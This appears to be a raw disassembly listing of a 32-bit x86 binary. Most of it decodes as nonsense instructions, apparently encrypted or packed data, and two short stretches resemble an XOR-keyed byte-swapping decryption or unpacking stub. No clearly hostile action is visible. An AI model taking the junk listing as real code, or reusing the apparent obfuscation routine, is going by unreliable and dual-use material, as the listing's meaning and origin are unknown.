  40c1f0:	adc    edx,esi
  40c1f2:	ins    DWORD PTR es:[edi],dx
  40c1f3:	sub    DWORD PTR [ecx+ecx*4-0x338496b2],eax
  40c1fa:	(bad)
  40c1fe:	jmp    0x40c1e8
  40c200:	dec    esp
  40c201:	lea    edx,[esi+ebp*1+0x23]
  40c205:	jp     0x40c204
  40c207:	xchg   edx,eax
  40c208:	pop    ebx
  40c209:	dec    ebx
  40c20a:	es mov dh,0x7e
  40c20d:	dec    ecx
  40c20e:	fwait
  40c20f:	and    DWORD PTR [ebp+0x2b],0xffffffea
  40c213:	xor    eax,0x8e1414f1
  40c218:	inc    ebx
  40c219:	cmp    eax,0xb8fd4089
  40c21e:	emms   
  40c220:	push   esp
  40c221:	inc    edx
  40c222:	in     al,dx
  40c223:	popa   
  40c224:	std    
  40c225:	jmp    0x4071efb7
  40c22a:	data16 test ch,0xe5
  40c22e:	xor    al,0x7
  40c230:	aas    
  40c231:	aaa    
  40c232:	add    al,0xd0
  40c234:	dec    ebx
  40c235:	les    ebp,FWORD PTR [ebx-0x62]
  40c238:	push   ds
  40c239:	mov    dh,0xdd
  40c23b:	xchg   cl,dh
  40c23d:	push   esi
  40c23e:	mov    eax,ds:0x3f418403
  40c243:	cmp    ebp,DWORD PTR [edx-0x8f5ef00]
  40c249:	sbb    al,0x71
  40c24b:	cld    
  40c24c:	addr16 dec ebp
  40c24e:	jbe    0x40c2b9
  40c250:	jge    0x40c26a
  40c252:	(bad)  
  40c253:	push   ds
  40c254:	popa   
  40c255:	mov    esi,0xd91e1ebf
  40c25a:	add    al,0x3f
  40c25c:	fmulp  st(4),st
  40c25e:	es sti 
  40c260:	mov    BYTE PTR [ecx],dh
  40c262:	mov    bh,0xac
  40c264:	push   esi
  40c265:	adc    dh,BYTE PTR [ebx-0x69b6141]
  40c26b:	scas   al,BYTE PTR es:[edi]
  40c26c:	iret   
  40c26d:	adc    bh,BYTE PTR [esi]
  40c26f:	ret    0x9569
  40c272:	mov    bh,0x91
  40c274:	(bad)  
  40c276:	push   es
  40c277:	adc    al,BYTE PTR [edi]
  40c279:	and    al,BYTE PTR [ecx+0x7400f68e]
  40c27f:	mov    ch,0x72
  40c281:	cs pusha 
  40c283:	mov    bh,BYTE PTR [esi]
  40c285:	in     eax,dx
  40c286:	test   al,0xb2
  40c288:	fiadd  WORD PTR [edx]
  40c28a:	frndint 
  40c28c:	cmp    esp,eax
  40c28e:	mov    DWORD PTR [ecx+0x59fab188],ebp
  40c294:	xor    eax,0x9e81afe
  40c299:	stos   BYTE PTR es:[edi],al
  40c29a:	push   esp
  40c29b:	fimul  WORD PTR [ecx-0x18356f1a]
  40c2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a2:	mov    DWORD PTR [ebp+0x69],edx
  40c2a5:	scas   al,BYTE PTR es:[edi]
  40c2a6:	popf   
  40c2a7:	cdq    
  40c2a8:	push   esi
  40c2a9:	cli    
  40c2aa:	jp     0x40c298
  40c2ac:	fucomip st,st(0)
  40c2ae:	or     al,0xff
  40c2b0:	mov    DWORD PTR [edi],0x8d195636
  40c2b6:	imul   edx,DWORD PTR [edx],0xffffffb2
  40c2b9:	or     eax,0xf8fa41d8
  40c2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2bf:	push   0xfffffff7
  40c2c1:	pop    eax
  40c2c2:	ficom  DWORD PTR [eax]
  40c2c4:	outs   dx,DWORD PTR ds:[esi]
  40c2c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c6:	clc    
  40c2c7:	imul   edi,DWORD PTR [esi-0x3b35ffb7],0xffffffb1
  40c2ce:	cmp    al,0xf8
  40c2d0:	and    DWORD PTR [eax-0x25],0x73
  40c2d4:	xor    BYTE PTR [ecx+0xa],bl
  40c2d7:	push   eax
  40c2d8:	cmp    ecx,edx
  40c2da:	je     0x40c269
  40c2dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2dd:	mov    al,0x12
  40c2df:	dec    esp
  40c2e0:	lods   al,BYTE PTR ds:[esi]
  40c2e1:	inc    esi
  40c2e2:	xchg   ebp,eax
  40c2e3:	lahf   
  40c2e4:	or     esi,eax
  40c2e6:	or     ch,BYTE PTR [edi+0x8]
  40c2e9:	addr16 in eax,0xce
  40c2ec:	pop    ds
  40c2ed:	jo     0x40c288
  40c2ef:	add    edx,DWORD PTR [eax+0x33d911ed]
  40c2f5:	pop    es
  40c2f6:	adc    DWORD PTR [edi-0x2e0d696e],0x7c1e8377
  40c300:	jg     0x40c325
  40c302:	xchg   edi,eax
  40c303:	cmp    eax,0x8e7c6a4b
  40c308:	rcl    BYTE PTR [edx],cl
  40c30a:	adc    bh,0xad
  40c30d:	leave  
  40c30e:	std    
  40c30f:	loope  0x40c364
  40c311:	mov    bl,0x35
  40c313:	sub    al,0xfb
  40c315:	cmp    dh,BYTE PTR [eax+ebp*8]
  40c318:	jp     0x40c36f
  40c31a:	popf   
  40c31b:	inc    ecx
  40c31c:	mov    ah,0x64
  40c31e:	jnp    0x40c2aa
  40c320:	outs   dx,BYTE PTR ds:[esi]
  40c321:	les    esi,FWORD PTR [esi+0x9]
  40c324:	arpl   cx,bx
  40c326:	mov    edi,0x59ccc29
  40c32b:	data16 rcl BYTE PTR [eax+0x5c],0x92
  40c330:	push   0x43
  40c332:	hlt    
  40c333:	mov    esi,0xca97eca0
  40c338:	aas    
  40c339:	cld    
  40c33a:	mov    ds:0xc64f34f0,al
  40c33f:	ds enter 0x8dff,0x60
  40c344:	xchg   dl,bh
  40c346:	lahf   
  40c347:	mov    dh,BYTE PTR [edi-0x7ec7d41f]
  40c34d:	addr16 pop ebp
  40c34f:	sbb    cl,BYTE PTR [eax-0x5cdeb799]
  40c355:	or     ebp,DWORD PTR [ecx-0x4f]
  40c358:	in     al,dx
  40c359:	nop
  40c35a:	jae    0x40c35c
  40c35c:	sbb    edx,DWORD PTR [edi+ebx*1]
  40c35f:	(bad)  
  40c360:	cmp    bl,BYTE PTR ds:0xc525c359
  40c366:	retf   
  40c367:	mov    ebp,0x2b032760
  40c36c:	leave  
  40c36d:	cmp    edi,edx
  40c36f:	mov    es,WORD PTR [edi+esi*8+0x6ba8288b]
  40c376:	inc    edx
  40c377:	jle    0x40c398
  40c379:	popa   
  40c37a:	jb     0x40c3c3
  40c37c:	sbb    bl,BYTE PTR [edi+0x58]
  40c37f:	xlat   BYTE PTR ds:[ebx]
  40c380:	jae    0x40c3d3
  40c382:	xchg   esp,eax
  40c383:	pop    esp
  40c384:	sub    al,0x6
  40c386:	retf   0xfaa1
  40c389:	and    DWORD PTR [edx],esi
  40c38b:	cmp    esp,DWORD PTR ds:0xa2840b43
  40c391:	add    eax,0x60e58482
  40c396:	sub    esp,0xffffffdd
  40c399:	adc    eax,0x69773692
  40c39e:	sar    BYTE PTR [ecx+ebx*8-0x1c],1
  40c3a2:	sub    eax,0x24a9c757
  40c3a7:	xor    ch,BYTE PTR [edi]
  40c3a9:	jecxz  0x40c3c7
  40c3ab:	and    eax,0xa76f86b9
  40c3b0:	and    DWORD PTR [esi-0x1af52e82],edx
  40c3b6:	or     eax,0x4edeb51e
  40c3bb:	mov    esi,0xf37b0b21
  40c3c0:	aas    
  40c3c1:	jnp    0x40c41e
  40c3c3:	jb     0x40c3b8
  40c3c5:	push   esi
  40c3c6:	mov    sp,0xb028
  40c3ca:	popf   
  40c3cb:	(bad)  
  40c3cc:	add    eax,0x6b5ed3d4
  40c3d1:	xchg   BYTE PTR [eax-0x1626de4e],cl
  40c3d7:	jne    0x40c3ee
  40c3d9:	pop    ebx
  40c3da:	(bad)  
  40c3db:	mov    ss,WORD PTR [ebp-0x3599a3e6]
  40c3e1:	mov    eax,0xe7d9ab77
  40c3e6:	and    DWORD PTR ds:0xaa42db4c,ebp
  40c3ec:	std    
  40c3ed:	cwde   
  40c3ee:	dec    ecx
  40c3ef:	dec    edx
  40c3f0:	frstor [ebx-0x783b1f3d]
  40c3f6:	sub    bl,BYTE PTR [edi-0x2faaef39]
  40c3fc:	js     0x40c448
  40c3fe:	dec    esp
  40c3ff:	mov    ebx,0x3bc201eb
  40c404:	adc    ebp,ebx
  40c406:	pop    edi
  40c407:	popf   
  40c408:	jle    0x960dff3b
  40c40e:	iret   
  40c40f:	push   es
  40c410:	or     edx,DWORD PTR [edx-0x64b30521]
  40c416:	mov    ch,ah
  40c418:	loop   0x40c3a3
  40c41a:	push   ecx
  40c41b:	sub    al,0x33
  40c41d:	inc    ebp
  40c41e:	mov    ds:0x1e949ef6,al
  40c423:	das    
  40c424:	push   ss
  40c425:	xchg   esi,eax
  40c426:	mov    ebx,0x41c0929d
  40c42b:	xchg   esp,eax
  40c42c:	imul   eax,DWORD PTR [edx-0x35a4d994],0x72
  40c433:	sbb    bh,BYTE PTR [ecx]
  40c435:	pop    ss
  40c436:	lods   al,BYTE PTR ds:[esi]
  40c437:	fsubr  st(1),st
  40c439:	xor    al,0x3
  40c43b:	mov    DWORD PTR [ebp-0x19],ecx
  40c43e:	icebp  
  40c43f:	outs   dx,DWORD PTR ds:[esi]
  40c440:	in     al,0x93
  40c442:	jb     0x40c3d3
  40c444:	stos   DWORD PTR es:[edi],eax
  40c445:	cmp    eax,0x9dd42568
  40c44a:	mov    dl,0xc3
  40c44c:	dec    esp
  40c44d:	mul    DWORD PTR [esi+0x51]
  40c450:	mov    al,0x96
  40c452:	cmp    al,0x10
  40c454:	dec    ebx
  40c455:	xchg   edx,eax
  40c456:	jg     0x40c483
  40c458:	stc    
  40c459:	xor    cl,BYTE PTR [ebx-0x63]
  40c45c:	sbb    ah,BYTE PTR [ecx+0x53303168]
  40c462:	adc    al,0xfa
  40c464:	jecxz  0x40c474
  40c466:	js     0x40c492
  40c468:	leave  
  40c469:	lods   eax,DWORD PTR ds:[esi]
  40c46a:	test   DWORD PTR [eax],eax
  40c46c:	push   edi
  40c46d:	sti    
  40c46e:	sub    al,ah
  40c470:	test   BYTE PTR [edx+0x3f],bl
  40c473:	xchg   BYTE PTR [eax+0x63],al
  40c476:	adc    al,0x37
  40c478:	or     bl,BYTE PTR ss:[edx]
  40c47b:	(bad)  
  40c47c:	jne    0x40c468
  40c47e:	mov    eax,0xb46bf8c1
  40c483:	lock xchg ecx,eax
  40c485:	pushf  
  40c486:	cmp    BYTE PTR [ebx],cl
  40c488:	or     cl,cl
  40c48a:	in     al,0x23
  40c48c:	mov    eax,0x5aff19e
  40c491:	or     BYTE PTR [esp+esi*1+0x781ba646],0x7e
  40c499:	push   edx
  40c49a:	popa   
  40c49b:	cli    
  40c49c:	push   ds
  40c49d:	mov    ecx,0x776af94
  40c4a2:	push   ss
  40c4a3:	dec    ecx
  40c4a4:	or     ch,BYTE PTR [edx+edx*1+0x1530b94e]
  40c4ab:	inc    esp
  40c4ac:	int3   
  40c4ad:	inc    esi
  40c4ae:	inc    esi
  40c4af:	clc    
  40c4b0:	fs ins DWORD PTR es:[edi],dx
  40c4b2:	xor    dh,cl
  40c4b4:	cld    
  40c4b5:	pusha  
  40c4b6:	lahf   
  40c4b7:	retf   
  40c4b8:	sar    esp,1
  40c4ba:	xor    dh,cl
  40c4bc:	cli    
  40c4bd:	mov    bh,0x99
  40c4bf:	test   eax,0xc23a3654
  40c4c4:	adc    al,0x59
  40c4c6:	popf   
  40c4c7:	lahf   
  40c4c8:	xor    al,0x6f
  40c4ca:	mov    edi,0x9e93b147
  40c4cf:	sub    BYTE PTR [ebp-0x388746dd],bl
  40c4d5:	in     eax,dx
  40c4d6:	scas   eax,DWORD PTR es:[edi]
  40c4d7:	outs   dx,DWORD PTR ds:[esi]
  40c4d8:	retf   
  40c4d9:	sti    
  40c4da:	xchg   ebp,eax
  40c4db:	or     eax,DWORD PTR [ebx+0x3556532]
  40c4e1:	mov    gs:0x21efd1bb,eax
  40c4e7:	xchg   ebp,eax
  40c4e8:	push   ecx
  40c4e9:	retf   
  40c4ea:	stc    
  40c4eb:	enter  0xc90c,0x34
  40c4ef:	adc    DWORD PTR [edx],esi
  40c4f1:	mov    esp,0xd7af0f3a
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	mov    al,ds:0xd0f1abc3
  40c544:	xchg   esi,eax
  40c545:	jle    0x40c5c5
  40c547:	jo     0x40c5c2
  40c549:	jle    0x40c5c9
  40c54b:	pop    es
  40c54c:	push   esi
  40c54d:	sub    eax,0xf810bf99
  40c552:	icebp  
  40c553:	fsincos 
  40c555:	mov    cl,0xb8
  40c557:	jo     0x40c5d3
  40c559:	enter  0x664c,0x2d
  40c55d:	frstor [esi+0x69738934]
  40c563:	jb     0x40c5b3
  40c565:	mov    cs,WORD PTR [edi]
  40c567:	xlat   BYTE PTR ds:[ebx]
  40c568:	jnp    0x40c52a
  40c56a:	jmp    0xd8084f27
  40c56f:	hlt    
  40c570:	sub    ebp,DWORD PTR [ecx+ebp*8]
  40c573:	xor    al,0xae
  40c575:	dec    edi
  40c576:	fild   QWORD PTR [ebx-0x2]
  40c579:	push   ds
  40c57a:	ss cmp eax,0x427a012b
  40c580:	mov    esi,0xd61f362f
  40c585:	push   es
  40c586:	or     al,BYTE PTR [eax+edx*4+0x2876fbff]
  40c58d:	sti    
  40c58e:	dec    ebp
  40c58f:	mov    al,0x2e
  40c591:	cmp    BYTE PTR [edi],ah
  40c593:	xor    BYTE PTR [edi],cl
  40c595:	mov    edi,0xc0b51f1e
  40c59a:	pop    ecx
  40c59b:	fisub  DWORD PTR [ecx]
  40c59d:	dec    esi
  40c59e:	ja     0x40c609
  40c5a0:	test   DWORD PTR [edi],esi
  40c5a2:	cs xor eax,0x3090846c
  40c5a8:	in     eax,0x74
  40c5aa:	jnp    0x40c574
  40c5ac:	mov    dh,0x51
  40c5ae:	out    0xb5,eax
  40c5b0:	mov    ah,0x2
  40c5b2:	cmp    bl,0xa
  40c5b5:	and    BYTE PTR [edx+0x57],al
  40c5b8:	into   
  40c5b9:	inc    ebp
  40c5ba:	inc    ecx
  40c5bb:	test   BYTE PTR ds:0x5dfec3f3,ch
  40c5c1:	inc    ecx
  40c5c2:	inc    DWORD PTR [ebx+0x7738234a]
  40c5c8:	aad    0x85
  40c5ca:	aas    
  40c5cb:	or     eax,0xe53c477d
  40c5d0:	xchg   DWORD PTR [edi-0x1e],eax
  40c5d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d4:	daa    
  40c5d5:	(bad)  
  40c5d6:	mov    dh,ah
  40c5d8:	call   esp
  40c5da:	shl    DWORD PTR [ebp-0x7fcc38d7],0x21
  40c5e1:	and    ch,BYTE PTR [eax-0x5374492f]
  40c5e7:	fstp   st(3)
  40c5e9:	(bad)  
  40c5ea:	xchg   ecx,eax
  40c5eb:	fmul   DWORD PTR [ecx-0xf]
  40c5ee:	and    al,0x90
  40c5f0:	bound  ebx,QWORD PTR [esi+0x742c4bfd]
  40c5f6:	adc    eax,0x7598c5ca
  40c5fb:	dec    eax
  40c5fc:	push   ds
  40c5fd:	lea    edi,[ebx+esi*4+0x30]
  40c601:	xchg   edi,eax
  40c602:	adc    dh,BYTE PTR [ecx]
  40c604:	jle    0x40c64d
  40c606:	lahf   
  40c607:	fdivr  DWORD PTR [edi+0x41f258d3]
  40c60d:	fldcw  WORD PTR [ebx]
  40c60f:	mov    ss,ebp
  40c611:	cmp    dh,bl
  40c613:	push   cs
  40c614:	and    DWORD PTR [edi],esi
  40c616:	jae    0x40c65a
  40c618:	sbb    DWORD PTR [edi+0xb],eax
  40c61b:	jg     0x40c663
  40c61d:	adc    ah,BYTE PTR [ebx]
  40c61f:	and    ebx,esp
  40c621:	imul   esi,DWORD PTR [edx],0x9b343a55
  40c627:	inc    ebp
  40c628:	adc    ch,BYTE PTR [edi-0x458b8411]
  40c62e:	scas   al,BYTE PTR es:[edi]
  40c62f:	jg     0x40c654
  40c631:	fisubr WORD PTR [ebx]
  40c633:	in     eax,0x51
  40c635:	fwait
  40c636:	add    DWORD PTR [ecx+0x73],0xffffffaa
  40c63a:	ss pop edi
  40c63c:	inc    ebp
  40c63d:	das    
  40c63e:	xor    DWORD PTR [ebx],esi
  40c640:	xchg   esi,eax
  40c641:	cmp    al,0x0
  40c643:	call   0xaec:0x89caf462
  40c64a:	inc    edi
  40c64b:	add    eax,0xfc689afc
  40c650:	ja     0x40c5e5
  40c652:	jns    0x40c6bf
  40c654:	sub    bl,BYTE PTR [edi]
  40c656:	cld    
  40c657:	sahf   
  40c658:	nop
  40c659:	push   eax
  40c65a:	dec    ebx
  40c65b:	and    al,0x78
  40c65d:	xchg   edx,eax
  40c65e:	lods   al,BYTE PTR ds:[esi]
  40c65f:	mov    WORD PTR [ebp-0x20f6ea50],ss
  40c665:	cmp    ebx,DWORD PTR [eax]
  40c667:	pop    edx
  40c668:	(bad)  [edx]
  40c66a:	inc    eax
  40c66b:	jmp    0x40c62e
  40c66d:	mov    al,0xfd
  40c66f:	mov    esp,0x3c0cd5a6
  40c674:	hlt    
  40c675:	jo     0x40c66c
  40c677:	loope  0x40c5fb
  40c679:	push   0x817f2c86
  40c67e:	popa   
  40c67f:	and    ah,bl
  40c681:	lods   al,BYTE PTR ds:[esi]
  40c682:	xchg   esi,eax
  40c683:	jns    0x40c68f
  40c685:	js     0x40c6ee
  40c687:	sub    al,0x2e
  40c689:	sbb    DWORD PTR [edx-0x3414eb98],ecx
  40c68f:	cmp    DWORD PTR ss:[edi+0x1aa05c89],esp
  40c696:	or     ax,0x1092
  40c69a:	pop    ebx
  40c69b:	lea    edi,[esi]
  40c69d:	gs popa 
  40c69f:	out    0x62,eax
  40c6a1:	aam    0xc1
  40c6a3:	xor    ebp,eax
  40c6a5:	scas   eax,DWORD PTR es:[edi]
  40c6a6:	mov    eax,ds:0xbf65f193
  40c6ab:	addr16 ret 0xe7b6
  40c6af:	pop    es
  40c6b0:	sub    DWORD PTR [ebp-0x54],ebx
  40c6b3:	fsub   DWORD PTR [esp+eiz*4-0x560f682d]
  40c6ba:	sub    edx,edx
  40c6bc:	mov    eax,ds:0xa31d1d60
  40c6c1:	stos   BYTE PTR es:[edi],al
  40c6c2:	aas    
  40c6c3:	mov    ebp,0x3741d237
  40c6c8:	pop    si
  40c6ca:	mov    ah,0xd4
  40c6cc:	fild   QWORD PTR [eax]
  40c6ce:	mov    WORD PTR [edi],fs
  40c6d0:	fs test eax,0xd3ed23e8
  40c6d6:	and    ebp,DWORD PTR [ecx-0x55]
  40c6d9:	ret    0x5777
  40c6dc:	addr16 push esi
  40c6de:	cmp    ebx,eax
  40c6e0:	or     esi,DWORD PTR [edi-0x6b592b5f]
  40c6e6:	fild   QWORD PTR [esi+ebp*2]
  40c6e9:	push   cs
  40c6ea:	addr16 adc edi,esp
  40c6ed:	dec    ecx
  40c6ee:	sub    eax,0xc24006b2
  40c6f3:	leave  
  40c6f4:	shr    BYTE PTR [esi+0x6c],1
  40c6f7:	sti    
  40c6f8:	iret   
  40c6f9:	push   eax
  40c6fa:	lock mov edi,0x5a492375
  40c700:	xor    bh,BYTE PTR [edx]
  40c702:	sub    DWORD PTR [esi],edx
  40c704:	mov    cl,0x44
  40c706:	es inc esp
  40c708:	add    edi,DWORD PTR [ebx]
  40c70a:	je     0x40c6be
  40c70c:	mov    eax,0x5ad92b90
  40c711:	test   esi,ebp
  40c713:	das    
  40c714:	aas    
  40c715:	test   DWORD PTR [edi+0x29],0x47284a83
  40c71c:	mov    eax,0x56097b5b
  40c721:	pop    ss
  40c722:	(bad)  [edi]
  40c724:	mov    ebx,0xb7e1eb7a
  40c729:	std    
  40c72a:	(bad)  
  40c72c:	add    DWORD PTR [eax+0x1cfa6768],ebp
  40c732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c733:	out    dx,al
  40c734:	fild   WORD PTR [ebp-0x13]
  40c737:	add    DWORD PTR ds:0x970a04f7,ebp
  40c73d:	popf   
  40c73e:	jnp    0x40c7ba
  40c740:	fbstp  TBYTE PTR [edi]
  40c742:	push   ebp
  40c743:	jp     0x40c7a0
  40c745:	aam    0xd1
  40c747:	arpl   cx,bp
  40c749:	aas    
  40c74a:	inc    esp
  40c74b:	(bad)  
  40c74c:	iret   
  40c74d:	sub    dl,al
  40c74f:	in     al,0x4b
  40c751:	mov    dl,0xb9
  40c753:	and    BYTE PTR [eax-0x9350ddb],ch
  40c759:	add    al,bl
  40c75b:	xchg   edx,eax
  40c75c:	ja     0x40c7bf
  40c75e:	add    DWORD PTR [ecx-0x18],ebx
  40c761:	repnz xor eax,0x742b0208
  40c767:	shr    DWORD PTR [eax+0x5d4efeb4],cl
  40c76d:	mov    dh,0x59
  40c76f:	fisub  DWORD PTR [ebp+ecx*4-0x8]
  40c773:	dec    ebp
  40c774:	imul   ebp,DWORD PTR [esi-0x365cc850],0xffffffc1
  40c77b:	or     DWORD PTR [edx+0x38b2834c],ecx
  40c781:	sub    edi,ebx
  40c783:	stos   BYTE PTR es:[edi],al
  40c784:	fwait
  40c785:	ret    
  40c786:	mov    edx,0x342e9b85
  40c78b:	shl    DWORD PTR [ebx],cl
  40c78d:	jmp    0xc6be3962
  40c792:	fs inc esp
  40c794:	addr16 mov al,ds:0x85e4
  40c798:	pop    ecx
  40c799:	pop    ds
  40c79a:	bound  ecx,QWORD PTR [edx+0x11]
  40c79d:	and    BYTE PTR [ecx-0x34],dh
  40c7a0:	and    ebp,DWORD PTR [ebx-0x2b]
  40c7a3:	mov    edi,0x3ae8f11c
  40c7a8:	mov    al,0x91
  40c7aa:	arpl   cx,ax
  40c7ac:	jl     0x40c76d
  40c7ae:	xchg   edi,eax
  40c7af:	cdq    
  40c7b0:	(bad)  
  40c7b1:	data16 data16 aad 0xc
  40c7b5:	push   ebx
  40c7b6:	jmp    0x40c7d0
  40c7b8:	in     eax,dx
  40c7b9:	repnz add DWORD PTR [eax],0xeb8287a7
  40c7c0:	inc    esp
  40c7c1:	xchg   ecx,esi
  40c7c3:	add    eax,0x8440b5d3
  40c7c8:	and    DWORD PTR [ebp-0x6c1926fd],ecx
  40c7ce:	or     BYTE PTR [edi+0x42],0x8a
  40c7d2:	shl    bl,cl
  40c7d4:	add    DWORD PTR [ebp+0x48],esi
  40c7d7:	scas   eax,DWORD PTR es:[edi]
  40c7d8:	fnsave [ecx]
  40c7da:	out    0x9e,eax
  40c7dc:	out    dx,eax
  40c7dd:	ds mov ebp,0xb541cd89
  40c7e3:	add    DWORD PTR [edi],esi
  40c7e5:	loope  0x40c821
  40c7e7:	adc    DWORD PTR [esi],edx
  40c7e9:	addr16 xchg ecx,eax
  40c7eb:	loopne 0x40c861
  40c7ed:	fstp   TBYTE PTR ds:0x51b314ab
  40c7f3:	jnp    0x40c7b0
  40c7f5:	rcl    DWORD PTR [ebx+0x6d7e7e15],1
  40c7fb:	loop   0x40c84c
  40c7fd:	das    
  40c7fe:	nop
  40c7ff:	inc    eax
  40c800:	and    eax,DWORD PTR [esi-0x3aeffd6]
  40c806:	ins    BYTE PTR es:[edi],dx
  40c807:	rol    BYTE PTR [ecx+0x1ef914ae],cl
  40c80d:	cmp    DWORD PTR [ecx+0x65],ebx
  40c810:	imul   edx,DWORD PTR [edx+edi*8],0xa32be794
  40c817:	adc    eax,0x370b4eeb
  40c81c:	mov    ecx,0x2d27ab6a
  40c821:	ror    DWORD PTR [ebp-0x30693c0],cl
  40c827:	inc    edi
  40c828:	xchg   esi,eax
  40c829:	pop    eax
  40c82a:	mov    dl,0x4c
  40c82c:	cmp    BYTE PTR [ebx-0x12e9200c],dl
  40c832:	aaa    
  40c833:	arpl   di,di
  40c835:	xchg   esp,eax
  40c836:	and    dh,BYTE PTR [edx-0x23b8db02]
  40c83c:	pop    ds
  40c83d:	dec    ecx
  40c83e:	mov    ds:0x51b58f4f,al
  40c843:	mov    al,0x35
  40c845:	enter  0x6a6f,0x6a
  40c849:	jb     0x40c832
  40c84b:	(bad)  
  40c84c:	pop    ebx
  40c84d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c84e:	mov    esi,esp
  40c850:	loope  0x40c870
  40c852:	fs mov edi,0x7363296d
  40c858:	add    ecx,esp
  40c85a:	(bad)  
  40c85b:	cdq    
  40c85c:	jnp    0x40c85d
  40c85e:	ss cmp ecx,esi
  40c861:	ror    BYTE PTR [eax+0x7f401aed],cl
  40c867:	mov    ebx,?
  40c869:	dec    esi
  40c86a:	xchg   ecx,eax
  40c86b:	js     0x40c88b
  40c86d:	ret    0x5b9d
  40c870:	fwait
  40c871:	inc    ebp
  40c872:	jno    0x40c8c1
  40c874:	je     0x40c8bb
  40c876:	jno    0x40c800
  40c878:	stc    
  40c879:	pop    edx
  40c87a:	mov    ebp,0xff761928
  40c87f:	mov    eax,0x5262350f
  40c884:	jae    0x40c899
  40c886:	loopne 0x40c829
  40c888:	sbb    bl,BYTE PTR [esi]
  40c88a:	into   
  40c88b:	cmp    eax,0x844a29c1
  40c890:	das    
  40c891:	xchg   edi,eax
  40c892:	push   ds
  40c893:	dec    eax
  40c894:	call   0x6a9d6df0
  40c899:	jge    0x40c900
  40c89b:	repz jmp FWORD PTR [edi]
  40c89e:	int3   
  40c89f:	sbb    DWORD PTR [eax+0x3f],eax
  40c8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a3:	cmp    ah,BYTE PTR fs:[ebp-0x6e6aa249]
  40c8aa:	sbb    eax,DWORD PTR [ecx]
  40c8ac:	and    al,0x40
  40c8ae:	jle    0x40c8ed
  40c8b0:	mov    DWORD PTR [ecx],ebp
  40c8b2:	pusha  
  40c8b3:	fdiv   QWORD PTR [ebx-0x15a4d59b]
  40c8b9:	mov    edx,0xad9cac2
  40c8be:	dec    ecx
  40c8bf:	mov    bh,0x3d
  40c8c1:	mov    ecx,0x8aa81b39
  40c8c6:	(bad)  
  40c8c7:	call   0xcfea4846
  40c8cc:	cmp    ebx,DWORD PTR [esi+edx*1-0x6fd715b6]
  40c8d3:	add    eax,0x473f56b1
  40c8d8:	sbb    BYTE PTR [ecx+0x565949fd],ah
  40c8de:	add    DWORD PTR [ebp-0x70],ecx
  40c8e1:	aad    0xa7
  40c8e3:	dec    edi
  40c8e4:	and    dh,BYTE PTR [esi]
  40c8e6:	cmp    bl,BYTE PTR [ebx-0x7ee0f688]
  40c8ec:	cmp    dh,BYTE PTR [edi]
  40c8ee:	add    BYTE PTR [eax-0x14c8eb68],bh
  40c8f4:	adc    cl,BYTE PTR [ebx+edi*4]
  40c8f7:	adc    esi,DWORD PTR [ecx]
  40c8f9:	out    0x21,eax
  40c8fb:	xchg   ebx,eax
  40c8fc:	gs pop esp
  40c8fe:	gs popf 
  40c900:	aam    0xc
  40c902:	cmp    al,dl
  40c904:	icebp  
  40c905:	or     BYTE PTR [ecx],0x4
  40c908:	arpl   WORD PTR [ecx+0x13],cx
  40c90b:	leave  
  40c90c:	cmp    DWORD PTR [edx],esi
  40c90e:	xor    edx,DWORD PTR [ebx]
  40c910:	retf   
  40c911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c912:	retf   0x699
  40c915:	enter  0xbb3f,0xe8
  40c919:	push   ss
  40c91a:	scas   eax,DWORD PTR es:[edi]
  40c91b:	cmp    al,0x2d
  40c91d:	sbb    eax,DWORD PTR ds:0xb3cc98ac
  40c923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c924:	clc    
  40c925:	push   edi
  40c926:	xchg   edx,eax
  40c927:	mov    bl,0x49
  40c929:	dec    ecx
  40c92a:	push   edx
  40c92b:	repnz (bad)
  40c92e:	jmp    0x7950:0x3c35e2
  40c935:	add    DWORD PTR [ebx-0x21e46a0c],0x5d
  40c93c:	pop    esp
  40c93d:	repz mov edi,0x9366a69
  40c943:	call   0xec95cc87
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
